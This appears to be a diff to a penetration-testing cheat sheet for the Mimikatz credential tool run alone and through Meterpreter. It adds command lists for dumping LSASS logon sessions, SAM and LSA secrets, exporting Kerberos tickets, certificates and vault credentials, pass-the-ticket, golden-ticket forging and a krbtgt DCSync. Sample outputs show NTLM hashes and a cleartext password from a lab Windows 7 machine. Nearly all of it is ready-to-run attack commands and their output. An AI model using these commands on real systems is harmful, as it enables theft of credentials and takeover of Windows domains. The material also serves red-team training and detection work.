@@ -1,3 +1,6 @@
+- meterpreter > load mimikatz
+- meterpreter > kerberos 
+- meterpreter > msv
 
 - mimikatz # system::user
 - mimikatz # system::computer
@@ -12,18 +15,70 @@
 - mimikatz # kerberos::list /export
 - mimikatz # inject::process lsass.exe sekurlsa.dll
 - mimikatz # inject::pid lsass.exe sekurlsa.dll
-
-
 - mimikatz # lsadump::sam
 - mimikatz # lsadump::lsa /id:500
 - mimikatz # lsadump::lsa /inject /name:krbtgt
 - mimikatz # lsadump::lsa /patch
 - mimikatz # privilege::debug
+- mimikatz # lsadump::sam SystemBkup.hiv SamBkup.hiv
+- sekurlsa::tickets /export
 - token::whoami
 - token::elevate
-- mimikatz # lsadump::sam SystemBkup.hiv SamBkup.hiv
+- kerberos::list /export
+- kerberos::ptt c:\chocolate.kirbi
+- kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
+- crypto::capi
+- crypto::cng
+- crypto::certificates /export
+- crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
+- crypto::keys /export
+- crypto::keys /machine /export
+- vault::cred
+- vault::list
 
-[Samples]
+
+token::elevate
+vault::cred
+vault::list
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+token::revert
+
+lsadump::dcsync /user:domain\krbtgt /domain:lab.local
+
+
+==========================
+Show all mimikatz modules
+
+- mimikatz_command -f fu::
+
+Module : 'fu' introuvable
+
+Modules disponibles : 
+            	- Standard
+      crypto	- Cryptographie et certificats
+        hash	- Hash
+      system	- Gestion syst?me
+     process	- Manipulation des processus
+      thread	- Manipulation des threads
+     service	- Manipulation des services
+   privilege	- Manipulation des privil?ges
+      handle	- Manipulation des handles
+ impersonate	- Manipulation tokens d'acc?s
+     winmine	- Manipulation du d?mineur
+ minesweeper	- Manipulation du d?mineur 7
+       nogpo	- Anti-gpo et patchs divers
+     samdump	- Dump de SAM
+      inject	- Injecteur de librairies
+          ts	- Terminal Server
+      divers	- Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
+    sekurlsa	- Dump des sessions courantes par providers LSASS
+         efs	- Manipulations EFS
+
+=====================
+
+[Samples #1]
 
 mimikatz # lsadump::sam
 Domain : W7-PC
@@ -53,6 +108,7 @@ LM   :
 NTLM : 608107e444136f9aab331d3f00a72c22
 
 ------------------------------------------
+[Sample #2]
 
 mimikatz # sekurlsa::logonpasswords
 
@@ -187,6 +243,65 @@ SID               : S-1-5-18
 	 * Password : (null)
 	ssp :	
 	credman :
+---------------------------------
+[Sample #3]
 
+vault::list
+
+Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
+	Name       : My KeyRing
+	Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+	Items (0)
+
+Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
+	Name       : Windows Vault
+	Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault
+	Items (0)
+
+---------------------------------
+[Sample #4]
+
+meterpreter > msv
+[!] Not currently running as SYSTEM
+[*] Attempting to getprivs
+[+] Got SeDebugPrivilege
+[*] Retrieving msv credentials
+msv credentials
+===============
+
+AuthID    Package    Domain        User           Password
+------    -------    ------        ----           --------
+0;111287  NTLM       w7-PC         w7             lm{ 7775a6088dadd30b95873f3421ecab49 }, ntlm{ 820bf5b3240a3a66ee5cb82917ff1dd2 }
+0;111241  NTLM       w7-PC         w7             lm{ 7775a6000dadd30b95873f3421ecab49 }, ntlm{ 817bf5b3240a3a66ee5cb82917ff1dd2 }
+0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  n.s. (Credentials KO)
+0;996     Negotiate  WORKGROUP     W7-PC$         n.s. (Credentials KO)
+0;22557   NTLM                                    n.s. (Credentials KO)
+0;999     NTLM       WORKGROUP     W7-PC$         n.s. (Credentials KO)
+
+--------------------------------
+[Sample #5]
+
+meterpreter > kerberos 
+[!] Not currently running as SYSTEM
+[*] Attempting to getprivs
+[+] Got SeDebugPrivilege
+[*] Retrieving kerberos credentials
+kerberos credentials
+====================
+
+AuthID    Package    Domain        User           Password
+------    -------    ------        ----           --------
+0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
+0;996     Negotiate  WORKGROUP     W7-PC$         
+0;22557   NTLM                                    
+0;999     NTLM       WORKGROUP     W7-PC$         
+0;111287  NTLM       w7-PC         w7             [P#sSWorPlan0]
+0;111241  NTLM       w7-PC         w7             [P#sSWorPlan0]
+
+
+
+https://www.offensive-security.com/metasploit-unleashed/mimikatz/
+https://www.sans.org/reading-room/whitepapers/tools/mimikatz-overview-defenses-detection-36780
 https://github.com/gentilkiwi/mimikatz
+https://github.com/gentilkiwi/mimikatz/releases
 http://blog.gentilkiwi.com/mimikatz
